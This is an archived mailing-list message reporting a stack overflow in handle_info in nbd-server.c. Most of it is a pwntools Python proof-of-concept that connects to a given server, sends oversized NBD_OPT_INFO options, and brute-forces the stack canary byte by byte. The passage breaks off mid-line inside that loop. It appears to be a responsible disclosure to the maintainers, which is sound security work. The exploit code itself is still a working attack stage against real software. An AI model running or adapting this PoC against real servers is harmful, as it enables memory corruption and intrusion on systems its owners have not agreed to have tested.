<!-- MHonArc v2.6.19 -->
<!--X-Subject: report security problem of nbd -->
<!--X-From-R13: =?GFT&#45;8?P?546Z5nEn?= &#60;qhb.jnatNpunvgva.pbz> -->
<!--X-Date: Mon, 24 Jan 2022 04:27:13 +0000 (UTC) -->
<!--X-Message-Id: CAFfU0HAYyuiuvVDe622zP7OLXDYRftrYzvYjeRxgLaKoq2E0+A@mail.gmail.com -->
<!--X-Content-Type: multipart/alternative -->
<!--X-Head-End-->
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
        "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<title>report security problem of nbd</title>
<link rev="made" href="mailto:duo.wang@chaitin.com">
<link rel="index" href="maillist.html">
<link rel="top" href="threads.html">
<link rel="up" href="msg00037.html">
<link rel="prev" href="msg00036.html">
<link rel="next" href="msg00038.html">
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
pre {
  white-space: pre-wrap;
}
</style>
</head>
<body>
<!--X-Body-Begin-->
<!--X-User-Header-->
<!--X-User-Header-End-->
<!--X-TopPNI-->
<hr>
<form method="POST" action="/cgi-bin/spam-report.pl">
<input type="hidden" name="listname" value="nbd" />
<input type="hidden" name="msg" value="msg00037.html" />
<input type="hidden" name="date" value="2022/01" />
<input type="submit" value="Report as spam" style="float: right"  />

[<a href="msg00036.html">Date Prev</a>][<a href="msg00038.html">Date Next</a>]
[<a href="msg00036.html">Thread Prev</a>][<a href="msg00038.html">Thread Next</a>]
[<a href="maillist.html#00037">Date Index</a>]
[<a href="threads.html#00037">Thread Index</a>]
</form>


<!--X-TopPNI-End-->
<!--X-MsgBody-->
<!--X-Subject-Header-Begin-->
<h1>report security problem of nbd</h1>
<hr>
<!--X-Subject-Header-End-->
<!--X-Head-of-Message-->
<ul>
<li><em>To</em>: <a href="mailto:nbd%40other.debian.org">nbd@other.debian.org</a></li>
<li><em>Subject</em>: report security problem of nbd</li>
<li><em>From</em>: &#x738B;&#x591A; &lt;<a href="mailto:duo.wang%40chaitin.com">duo.wang@chaitin.com</a>&gt;</li>
<li><em>Date</em>: Mon, 24 Jan 2022 12:10:06 +0800</li>
<li><em>Message-id</em>: &lt;<A HREF="/msgid-search/CAFfU0HAYyuiuvVDe622zP7OLXDYRftrYzvYjeRxgLaKoq2E0+A@mail.gmail.com">[&#128270;]</a>&nbsp;<a href="msg00037.html">CAFfU0HAYyuiuvVDe622zP7OLXDYRftrYzvYjeRxgLaKoq2E0+A@mail.gmail.com</A>&gt;</li>
</ul>
<!--X-Head-of-Message-End-->
<!--X-Head-Body-Sep-Begin-->
<hr>
<!--X-Head-Body-Sep-End-->
<!--X-Body-of-Message-->
<div dir="ltr"><div dir="ltr"><div dir="ltr"><div dir="ltr"><div dir="ltr"><div dir="ltr"><div dir="ltr"><div dir="ltr"><div dir="ltr"><div dir="ltr"><div dir="ltr"><div dir="ltr"><div dir="ltr"><div dir="ltr"><div dir="ltr"><div dir="ltr"><div dir="ltr"><div dir="ltr"><div dir="ltr"><div dir="ltr"><div dir="ltr"><div dir="ltr"><div dir="ltr"><div dir="ltr"><div dir="ltr"><div dir="ltr"><div dir="ltr"><div dir="ltr">1.stack overflow&#xA0;<div>In nbd-server.c, function handle_info have a stack overflow&#xA0;</div><div><br></div><div><a rel="nofollow" href="https://github.com/NetworkBlockDevice/nbd/blob/5750003711b8050bad3ddaf5196201ef419ce15d/nbd-server.c#L2299" target="_blank">https://github.com/NetworkBlockDevice/nbd/blob/5750003711b8050bad3ddaf5196201ef419ce15d/nbd-server.c#L2299</a><br></div><div><br></div><div>len can be controlled by an attacker, the buf size is 1024, when `len - sizeof(namelen) &gt; 1024` the buf overflow.</div><div><br></div><div>python poc code as following:</div><div><div style="color:rgb(171,178,191);background-color:rgb(40,44,52);font-family:Consolas,&quot;Courier New&quot;,monospace;font-size:14px;line-height:19px;white-space:pre"><div><span style="color:rgb(198,120,221);font-style:italic">from</span> pwn <span style="color:rgb(198,120,221);font-style:italic">import</span> <span style="color:rgb(86,182,194)">*</span></div><div><span style="color:rgb(198,120,221);font-style:italic">import</span> <span style="color:rgb(229,192,123)">time</span></div><div><span style="color:rgb(198,120,221);font-style:italic">import</span> <span style="color:rgb(229,192,123)">sys</span></div><br><div>context.endian <span style="color:rgb(86,182,194)">=</span> <span style="color:rgb(152,195,121)">&quot;big&quot;</span></div><div>context.log_level <span style="color:rgb(86,182,194)">=</span> <span style="color:rgb(152,195,121)">&quot;debug&quot;</span></div><br><div><span style="color:rgb(224,108,117)">elf</span> <span style="color:rgb(86,182,194)">=</span> <span style="color:rgb(97,175,239)">ELF</span>(<span style="color:rgb(152,195,121)">&quot;./nbd-server&quot;</span>)</div><br><div><span style="color:rgb(229,192,123)">NBD_OPT</span> <span style="color:rgb(86,182,194)">=</span> {</div><div>&#xA0; &#xA0; <span style="color:rgb(152,195,121)">&quot;NBD_OPT_EXPORT_NAME&quot;</span>:<span style="color:rgb(209,154,102)">1</span>,</div><div>&#xA0; &#xA0; <span style="color:rgb(152,195,121)">&quot;NBD_OPT_ABORT&quot;</span>:<span style="color:rgb(209,154,102)">2</span>,</div><div>&#xA0; &#xA0; <span style="color:rgb(152,195,121)">&quot;NBD_OPT_LIST&quot;</span>:<span style="color:rgb(209,154,102)">3</span>,</div><div>&#xA0; &#xA0; <span style="color:rgb(152,195,121)">&quot;NBD_OPT_STARTTLS&quot;</span>:<span style="color:rgb(209,154,102)">5</span>,</div><div>&#xA0; &#xA0; <span style="color:rgb(152,195,121)">&quot;NBD_OPT_INFO&quot;</span>:<span style="color:rgb(209,154,102)">6</span>,</div><div>&#xA0; &#xA0; <span style="color:rgb(152,195,121)">&quot;NBD_OPT_GO&quot;</span>:<span style="color:rgb(209,154,102)">7</span>,</div><div>&#xA0; &#xA0; <span style="color:rgb(152,195,121)">&quot;NBD_OPT_STRUCTURED_REPLY&quot;</span>:<span style="color:rgb(209,154,102)">8</span>,</div><div>&#xA0; &#xA0; <span style="color:rgb(152,195,121)">&quot;NBD_OPT_LIST_META_CONTEXT&quot;</span>:<span style="color:rgb(209,154,102)">9</span>,</div><div>&#xA0; &#xA0; <span style="color:rgb(152,195,121)">&quot;NBD_OPT_SET_META_CONTEXT&quot;</span>:<span style="color:rgb(209,154,102)">10</span></div><div>}</div><br><div><span style="color:rgb(229,192,123)">NBD_NEW_VERSION</span> <span style="color:rgb(86,182,194)">=</span> <span style="color:rgb(198,120,221)">b</span><span style="color:rgb(152,195,121)">&quot;IHAVEOPT&quot;</span></div><br><div><span style="color:rgb(198,120,221)">def</span> <span style="color:rgb(97,175,239)">nbd_opt_info</span>(<span style="color:rgb(224,108,117);font-style:italic">buf</span>, <span style="color:rgb(224,108,117);font-style:italic">name</span>):</div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">option</span> <span style="color:rgb(86,182,194)">=</span> <span style="color:rgb(198,120,221)">b</span><span style="color:rgb(152,195,121)">&quot;&quot;</span></div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">option</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(229,192,123)">NBD_NEW_VERSION</span></div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">option</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(97,175,239)">p32</span>(<span style="color:rgb(229,192,123)">NBD_OPT</span>[<span style="color:rgb(152,195,121)">&quot;NBD_OPT_INFO&quot;</span>])</div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">option</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(97,175,239)">p32</span>(<span style="color:rgb(97,175,239)">len</span>(<span style="color:rgb(224,108,117);font-style:italic">buf</span>) <span style="color:rgb(86,182,194)">+</span> <span style="color:rgb(209,154,102)">4</span>)</div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">option</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(97,175,239)">p32</span>(<span style="color:rgb(97,175,239)">len</span>(<span style="color:rgb(224,108,117);font-style:italic">name</span>))</div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">option</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(224,108,117);font-style:italic">buf</span></div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">option</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(224,108,117);font-style:italic">name</span></div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">option</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(97,175,239)">p16</span>(<span style="color:rgb(209,154,102)">0</span>)</div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">p</span>.<span style="color:rgb(97,175,239)">send</span>(<span style="color:rgb(224,108,117)">option</span>)</div><br><div>&#xA0; &#xA0; <span style="color:rgb(198,120,221);font-style:italic">return</span> </div><br><div><span style="color:rgb(198,120,221)">def</span> <span style="color:rgb(97,175,239)">nbd_opt_list</span>():</div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">option</span> <span style="color:rgb(86,182,194)">=</span> <span style="color:rgb(198,120,221)">b</span><span style="color:rgb(152,195,121)">&quot;&quot;</span></div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">option</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(229,192,123)">NBD_NEW_VERSION</span></div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">option</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(97,175,239)">p32</span>(<span style="color:rgb(229,192,123)">NBD_OPT</span>[<span style="color:rgb(152,195,121)">&quot;NBD_OPT_LIST&quot;</span>])</div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">option</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(97,175,239)">p32</span>(<span style="color:rgb(209,154,102)">0</span>)</div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">p</span>.<span style="color:rgb(97,175,239)">send</span>(<span style="color:rgb(224,108,117)">option</span>)</div><br><div>&#xA0; &#xA0; <span style="color:rgb(198,120,221);font-style:italic">return</span> </div><br><div><span style="color:rgb(198,120,221)">def</span> <span style="color:rgb(97,175,239)">nbd_opt_structured_reply</span>():</div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">option</span> <span style="color:rgb(86,182,194)">=</span> <span style="color:rgb(198,120,221)">b</span><span style="color:rgb(152,195,121)">&quot;&quot;</span></div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">option</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(229,192,123)">NBD_NEW_VERSION</span></div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">option</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(97,175,239)">p32</span>(<span style="color:rgb(229,192,123)">NBD_OPT</span>[<span style="color:rgb(152,195,121)">&quot;NBD_OPT_STRUCTURED_REPLY&quot;</span>])</div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">option</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(97,175,239)">p32</span>(<span style="color:rgb(209,154,102)">0</span>)</div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">p</span>.<span style="color:rgb(97,175,239)">send</span>(<span style="color:rgb(224,108,117)">option</span>)</div><br><div>&#xA0; &#xA0; <span style="color:rgb(198,120,221);font-style:italic">return</span> </div><br><div><span style="color:rgb(198,120,221)">def</span> <span style="color:rgb(97,175,239)">nbd_opt_set_meta_context</span>(<span style="color:rgb(224,108,117);font-style:italic">exportname</span>, <span style="color:rgb(224,108,117);font-style:italic">querystring</span>):</div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">option</span> <span style="color:rgb(86,182,194)">=</span> <span style="color:rgb(198,120,221)">b</span><span style="color:rgb(152,195,121)">&quot;&quot;</span></div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">option</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(229,192,123)">NBD_NEW_VERSION</span></div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">option</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(97,175,239)">p32</span>(<span style="color:rgb(229,192,123)">NBD_OPT</span>[<span style="color:rgb(152,195,121)">&quot;NBD_OPT_SET_META_CONTEXT&quot;</span>])</div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">option</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(97,175,239)">p32</span>(<span style="color:rgb(209,154,102)">4</span> <span style="color:rgb(86,182,194)">+</span> <span style="color:rgb(97,175,239)">len</span>(<span style="color:rgb(224,108,117);font-style:italic">exportname</span>) <span style="color:rgb(86,182,194)">+</span> <span style="color:rgb(209,154,102)">4</span> <span style="color:rgb(86,182,194)">+</span> <span style="color:rgb(209,154,102)">4</span> <span style="color:rgb(86,182,194)">+</span> <span style="color:rgb(97,175,239)">len</span>(<span style="color:rgb(224,108,117);font-style:italic">querystring</span>))</div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">p</span>.<span style="color:rgb(97,175,239)">send</span>(<span style="color:rgb(224,108,117)">option</span>)</div><br><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">msg</span> <span style="color:rgb(86,182,194)">=</span> <span style="color:rgb(198,120,221)">b</span><span style="color:rgb(152,195,121)">&quot;&quot;</span></div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">msg</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(97,175,239)">p32</span>(<span style="color:rgb(97,175,239)">len</span>(<span style="color:rgb(224,108,117);font-style:italic">exportname</span>)) <span style="color:rgb(127,132,142);font-style:italic"># exportnamelen</span></div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">msg</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(224,108,117);font-style:italic">exportname</span>.<span style="color:rgb(97,175,239)">encode</span>(<span style="color:rgb(152,195,121)">&quot;latin&quot;</span>) <span style="color:rgb(127,132,142);font-style:italic"># exportname</span></div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">msg</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(97,175,239)">p32</span>(<span style="color:rgb(209,154,102)">1</span>) <span style="color:rgb(127,132,142);font-style:italic"># nr_queries</span></div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">msg</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(97,175,239)">p32</span>(<span style="color:rgb(97,175,239)">len</span>(<span style="color:rgb(224,108,117);font-style:italic">querystring</span>)) <span style="color:rgb(127,132,142);font-style:italic"># querylen</span></div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">msg</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(224,108,117);font-style:italic">querystring</span>.<span style="color:rgb(97,175,239)">encode</span>(<span style="color:rgb(152,195,121)">&quot;latin&quot;</span>) <span style="color:rgb(127,132,142);font-style:italic"># querystring</span></div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">p</span>.<span style="color:rgb(97,175,239)">send</span>(<span style="color:rgb(224,108,117)">msg</span>)</div><br><div>&#xA0; &#xA0; <span style="color:rgb(198,120,221);font-style:italic">return</span></div><br><div><span style="color:rgb(198,120,221)">def</span> <span style="color:rgb(97,175,239)">nbd_opt_list_meta_context</span>(<span style="color:rgb(224,108,117);font-style:italic">exportname</span>, <span style="color:rgb(224,108,117);font-style:italic">querystring</span>):</div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">option</span> <span style="color:rgb(86,182,194)">=</span> <span style="color:rgb(198,120,221)">b</span><span style="color:rgb(152,195,121)">&quot;&quot;</span></div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">option</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(229,192,123)">NBD_NEW_VERSION</span></div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">option</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(97,175,239)">p32</span>(<span style="color:rgb(229,192,123)">NBD_OPT</span>[<span style="color:rgb(152,195,121)">&quot;NBD_OPT_LIST_META_CONTEXT&quot;</span>])</div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">option</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(97,175,239)">p32</span>(<span style="color:rgb(209,154,102)">4</span> <span style="color:rgb(86,182,194)">+</span> <span style="color:rgb(97,175,239)">len</span>(<span style="color:rgb(224,108,117);font-style:italic">exportname</span>) <span style="color:rgb(86,182,194)">+</span> <span style="color:rgb(209,154,102)">4</span> <span style="color:rgb(86,182,194)">+</span> <span style="color:rgb(209,154,102)">4</span> <span style="color:rgb(86,182,194)">+</span> <span style="color:rgb(97,175,239)">len</span>(<span style="color:rgb(224,108,117);font-style:italic">querystring</span>))</div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">p</span>.<span style="color:rgb(97,175,239)">send</span>(<span style="color:rgb(224,108,117)">option</span>)</div><div>&#xA0; &#xA0; </div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">msg</span> <span style="color:rgb(86,182,194)">=</span> <span style="color:rgb(198,120,221)">b</span><span style="color:rgb(152,195,121)">&quot;&quot;</span></div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">msg</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(97,175,239)">p32</span>(<span style="color:rgb(97,175,239)">len</span>(<span style="color:rgb(224,108,117);font-style:italic">exportname</span>)) <span style="color:rgb(127,132,142);font-style:italic"># exportnamelen</span></div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">msg</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(224,108,117);font-style:italic">exportname</span>.<span style="color:rgb(97,175,239)">encode</span>(<span style="color:rgb(152,195,121)">&quot;latin&quot;</span>) <span style="color:rgb(127,132,142);font-style:italic"># exportname</span></div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">msg</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(97,175,239)">p32</span>(<span style="color:rgb(209,154,102)">1</span>) <span style="color:rgb(127,132,142);font-style:italic"># nr_queries</span></div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">msg</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(97,175,239)">p32</span>(<span style="color:rgb(97,175,239)">len</span>(<span style="color:rgb(224,108,117);font-style:italic">querystring</span>)) <span style="color:rgb(127,132,142);font-style:italic"># querylen</span></div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">msg</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(224,108,117);font-style:italic">querystring</span>.<span style="color:rgb(97,175,239)">encode</span>(<span style="color:rgb(152,195,121)">&quot;latin&quot;</span>) <span style="color:rgb(127,132,142);font-style:italic"># querystring</span></div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">p</span>.<span style="color:rgb(97,175,239)">send</span>(<span style="color:rgb(224,108,117)">msg</span>)</div><br><div>&#xA0; &#xA0; <span style="color:rgb(198,120,221);font-style:italic">return</span></div><br><div><span style="color:rgb(198,120,221)">def</span> <span style="color:rgb(97,175,239)">nbd_opt_go</span>(<span style="color:rgb(224,108,117);font-style:italic">exportname</span>, <span style="color:rgb(224,108,117);font-style:italic">info</span>):</div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">option</span> <span style="color:rgb(86,182,194)">=</span> <span style="color:rgb(198,120,221)">b</span><span style="color:rgb(152,195,121)">&quot;&quot;</span></div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">option</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(229,192,123)">NBD_NEW_VERSION</span></div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">option</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(97,175,239)">p32</span>(<span style="color:rgb(229,192,123)">NBD_OPT</span>[<span style="color:rgb(152,195,121)">&quot;NBD_OPT_GO&quot;</span>])</div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">option</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(97,175,239)">p32</span>(<span style="color:rgb(209,154,102)">4</span> <span style="color:rgb(86,182,194)">+</span> <span style="color:rgb(97,175,239)">len</span>(<span style="color:rgb(224,108,117);font-style:italic">exportname</span>) <span style="color:rgb(86,182,194)">+</span> <span style="color:rgb(209,154,102)">2</span> <span style="color:rgb(86,182,194)">+</span> <span style="color:rgb(209,154,102)">2</span>)</div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">p</span>.<span style="color:rgb(97,175,239)">send</span>(<span style="color:rgb(224,108,117)">option</span>)</div><div>&#xA0; &#xA0; </div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">msg</span> <span style="color:rgb(86,182,194)">=</span> <span style="color:rgb(198,120,221)">b</span><span style="color:rgb(152,195,121)">&quot;&quot;</span></div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">msg</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(97,175,239)">p32</span>(<span style="color:rgb(97,175,239)">len</span>(<span style="color:rgb(224,108,117);font-style:italic">exportname</span>)) <span style="color:rgb(127,132,142);font-style:italic"># exportnamelen</span></div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">msg</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(224,108,117);font-style:italic">exportname</span>.<span style="color:rgb(97,175,239)">encode</span>(<span style="color:rgb(152,195,121)">&quot;latin&quot;</span>) <span style="color:rgb(127,132,142);font-style:italic"># exportname</span></div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">msg</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(97,175,239)">p16</span>(<span style="color:rgb(209,154,102)">1</span>) <span style="color:rgb(127,132,142);font-style:italic"># nrinfos</span></div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">msg</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(97,175,239)">p16</span>(<span style="color:rgb(224,108,117);font-style:italic">info</span>) <span style="color:rgb(127,132,142);font-style:italic"># info</span></div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">p</span>.<span style="color:rgb(97,175,239)">send</span>(<span style="color:rgb(224,108,117)">msg</span>)</div><br><div>&#xA0; &#xA0; <span style="color:rgb(198,120,221);font-style:italic">return</span></div><br><div><span style="color:rgb(224,108,117)">t0</span> <span style="color:rgb(86,182,194)">=</span> <span style="color:rgb(229,192,123)">time</span>.<span style="color:rgb(97,175,239)">perf_counter</span>()</div><br><div><span style="color:rgb(198,120,221);font-style:italic">if</span> <span style="color:rgb(97,175,239)">len</span>(<span style="color:rgb(229,192,123)">sys</span>.<span style="color:rgb(224,108,117)">argv</span>) <span style="color:rgb(86,182,194)">&lt;</span> <span style="color:rgb(209,154,102)">3</span>:</div><div>&#xA0; &#xA0; <span style="color:rgb(97,175,239)">print</span>(<span style="color:rgb(152,195,121)">&quot;usage: nbdtest.py ip port&quot;</span>)</div><div>&#xA0; &#xA0; <span style="color:rgb(97,175,239)">exit</span>(<span style="color:rgb(209,154,102)">0</span>)</div><br><div><span style="color:rgb(224,108,117)">ip</span> <span style="color:rgb(86,182,194)">=</span> <span style="color:rgb(229,192,123)">sys</span>.<span style="color:rgb(224,108,117)">argv</span>[<span style="color:rgb(209,154,102)">1</span>]</div><div><span style="color:rgb(224,108,117)">port</span> <span style="color:rgb(86,182,194)">=</span> <span style="color:rgb(229,192,123)">int</span>(<span style="color:rgb(229,192,123)">sys</span>.<span style="color:rgb(224,108,117)">argv</span>[<span style="color:rgb(209,154,102)">2</span>])</div><div><span style="color:rgb(224,108,117)">p</span> <span style="color:rgb(86,182,194)">=</span> <span style="color:rgb(97,175,239)">remote</span>(<span style="color:rgb(224,108,117)">ip</span>, <span style="color:rgb(224,108,117)">port</span>)</div><br><div><span style="color:rgb(224,108,117)">p</span>.<span style="color:rgb(97,175,239)">recvuntil</span>(<span style="color:rgb(198,120,221)">b</span><span style="color:rgb(152,195,121)">&quot;NBDMAGICIHAVEOPT&quot;</span>)</div><div><span style="color:rgb(224,108,117)">gflag</span> <span style="color:rgb(86,182,194)">=</span> <span style="color:rgb(97,175,239)">u16</span>(<span style="color:rgb(224,108,117)">p</span>.<span style="color:rgb(97,175,239)">recv</span>())</div><div><span style="color:rgb(224,108,117)">p</span>.<span style="color:rgb(97,175,239)">send</span>(<span style="color:rgb(97,175,239)">p32</span>(<span style="color:rgb(224,108,117)">gflag</span>))</div><br><div><span style="color:rgb(224,108,117)">canary</span> <span style="color:rgb(86,182,194)">=</span> <span style="color:rgb(198,120,221)">b</span><span style="color:rgb(152,195,121)">&quot;</span><span style="color:rgb(86,182,194)">\x00</span><span style="color:rgb(152,195,121)">&quot;</span></div><div><span style="color:rgb(198,120,221);font-style:italic">for</span> <span style="color:rgb(224,108,117)">i</span> <span style="color:rgb(198,120,221);font-style:italic">in</span> <span style="color:rgb(229,192,123)">range</span>(<span style="color:rgb(209,154,102)">7</span>):</div><div>&#xA0; &#xA0; <span style="color:rgb(198,120,221);font-style:italic">for</span> <span style="color:rgb(224,108,117)">j</span> <span style="color:rgb(198,120,221);font-style:italic">in</span> <span style="color:rgb(229,192,123)">range</span>(<span style="color:rgb(209,154,102)">256</span>):</div><div>&#xA0; &#xA0; &#xA0; &#xA0; <span style="color:rgb(224,108,117)">payload</span> <span style="color:rgb(86,182,194)">=</span> <span style="color:rgb(198,120,221)">b</span><span style="color:rgb(152,195,121)">&quot;&quot;</span></div><div>&#xA0; &#xA0; &#xA0; &#xA0; <span style="color:rgb(224,108,117)">payload</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(198,120,221)">b</span><span style="color:rgb(152,195,121)">&quot;A&quot;</span><span style="color:rgb(86,182,194)">*</span><span style="color:rgb(209,154,102)">1032</span></div><div>&#xA0; &#xA0; &#xA0; &#xA0; <span style="color:rgb(224,108,117)">payload</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(224,108,117)">canary</span></div><div>&#xA0; &#xA0; &#xA0; &#xA0; <span style="color:rgb(224,108,117)">payload</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(97,175,239)">p8</span>(<span style="color:rgb(224,108,117)">j</span>)</div><div>&#xA0; &#xA0; &#xA0; &#xA0; <span style="color:rgb(97,175,239)">nbd_opt_info</span>(<span style="color:rgb(224,108,117)">payload</span>, <span style="color:rgb(198,120,221)">b</span><span style="color:rgb(152,195,121)">&quot;B&quot;</span><span style="color:rgb(86,182,194)">*</span><span style="color:rgb(209,154,102)">4096</span>)</div><div>&#xA0; &#xA0; &#xA0; &#xA0; <span style="color:rgb(224,108,117)">p</span>.<span style="color:rgb(97,175,239)">recvuntil</span>(<span style="color:rgb(198,120,221)">b</span><span style="color:rgb(152,195,121)">&quot;Export unknown&quot;</span>)</div><br><div>&#xA0; &#xA0; &#xA0; &#xA0; <span style="color:rgb(224,108,117)">p</span>.<span style="color:rgb(97,175,239)">send</span>(<span style="color:rgb(229,192,123)">NBD_NEW_VERSION</span> <span style="color:rgb(86,182,194)">+</span> <span style="color:rgb(97,175,239)">p32</span>(<span style="color:rgb(198,120,221)">0x</span><span style="color:rgb(209,154,102)">deadbeef</span>) <span style="color:rgb(86,182,194)">+</span> <span style="color:rgb(97,175,239)">p32</span>(<span style="color:rgb(209,154,102)">0</span>))</div><div>&#xA0; &#xA0; &#xA0; &#xA0; <span style="color:rgb(198,120,221);font-style:italic">try</span>:</div><div>&#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; <span style="color:rgb(224,108,117)">p</span>.<span style="color:rgb(97,175,239)">recvuntil</span>(<span style="color:rgb(198,120,221)">b</span><span style="color:rgb(152,195,121)">&quot;The given option is unknown to this server implementation&quot;</span>)</div><div>&#xA0; &#xA0; &#xA0; &#xA0; <span style="color:rgb(198,120,221);font-style:italic">except</span>:</div><div>&#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; <span style="color:rgb(224,108,117)">p</span>.<span style="color:rgb(97,175,239)">close</span>()</div><br><div>&#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; <span style="color:rgb(224,108,117)">p</span> <span style="color:rgb(86,182,194)">=</span> <span style="color:rgb(97,175,239)">remote</span>(<span style="color:rgb(224,108,117)">ip</span>, <span style="color:rgb(224,108,117)">port</span>)</div><div>&#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; <span style="color:rgb(224,108,117)">p</span>.<span style="color:rgb(97,175,239)">recvuntil</span>(<span style="color:rgb(198,120,221)">b</span><span style="color:rgb(152,195,121)">&quot;NBDMAGICIHAVEOPT&quot;</span>)</div><div>&#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; <span style="color:rgb(224,108,117)">gflag</span> <span style="color:rgb(86,182,194)">=</span> <span style="color:rgb(97,175,239)">u16</span>(<span style="color:rgb(224,108,117)">p</span>.<span style="color:rgb(97,175,239)">recv</span>())</div><div>&#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; <span style="color:rgb(224,108,117)">p</span>.<span style="color:rgb(97,175,239)">send</span>(<span style="color:rgb(97,175,239)">p32</span>(<span style="color:rgb(224,108,117)">gflag</span>))</div><div>&#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; <span style="color:rgb(198,120,221);font-style:italic">continue</span></div><br><div>&#xA0; &#xA0; &#xA0; &#xA0; <span style="color:rgb(224,108,117)">canary</span> <span style="color:rgb(86,182,194)">+=</span> <span 